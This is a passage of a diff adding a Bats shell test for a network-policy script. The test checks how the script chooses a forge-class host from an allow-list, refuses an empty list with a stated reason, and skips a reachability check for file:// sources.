+            verify_subject "$2"
+        ' _ "$p" "$1" "$BATS_TEST_TMPDIR/entries" "$2"
+    }
+    local forge_entries='forge name strict github.com
+forge name strict api.github.com
+open name strict registry.npmjs.org
+'
+    # A host present is used as-is - the file:// case must not change the
+    # ordinary one.
+    _subject api.github.com "$forge_entries"
+    [ "$output" = api.github.com ] || { echo "a real host was not used: $output"; return 1; }
+
+    # No host: the first permitted FORGE-class name, not an open-class one -
+    # check 4 looks the answer up in the forge class's own set.
+    _subject "" "$forge_entries"
+    [ "$output" = github.com ] \
+        || { echo "the fallback was not a forge-class name: $output"; return 1; }
+
+    # And nothing at all is empty, which check 3 turns into a refusal naming
+    # the cause rather than a lookup of "".
+    _subject "" ""
+    [ -z "$output" ] || { echo "invented a subject from nothing: $output"; return 1; }
+    grep -q 'there is no permitted forge-class name to check the resolver against' "$p" \
+        || { echo "an empty subject is not refused with a reason"; return 1; }
+
+    # check 5 asserts reachability THROUGH the policy, so a file source cannot
+    # satisfy it and must be skipped out loud rather than passing on a local
+    # read.
+    local c5
+    c5="$(sed -n '/check 5 skipped/,/esac/p' "$p")"
+    [ -n "$c5" ] || { echo "check 5 does not skip a file source"; return 1; }
+    grep -q 'file://\*' <<< "$(sed -n '/# Skipped for a file:\/\/ source/,/esac/p' "$p")" \
+        || { echo "the skip is not keyed to the file scheme"; return 1; }
 }
